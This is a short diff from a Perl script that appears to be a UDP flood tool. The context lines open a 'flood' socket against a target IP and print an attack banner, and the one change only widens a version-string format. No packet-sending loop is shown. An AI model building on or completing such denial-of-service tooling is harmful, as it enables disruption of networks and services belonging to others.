@@ -23,7 +23,7 @@ my ($iaddr,$endtime,$psize,$pport);
 $iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
 $endtime = time() + ($time ? $time : 1000000);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
-print colored( sprintf("%4.4s", 'Dev : Low Mod\n Verison : 1.0'), 'magenta' ), "\n";
+print colored( sprintf("%10.10s", 'Dev : Low Mod\n Verison : 1.0'), 'magenta' ), "\n";
 print "|IP|\t\t |Port|\t\t |Size|\t\t |Time|\n";
 print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
 print "To cancel the attack press 'Ctrl-C'\n" unless $time;
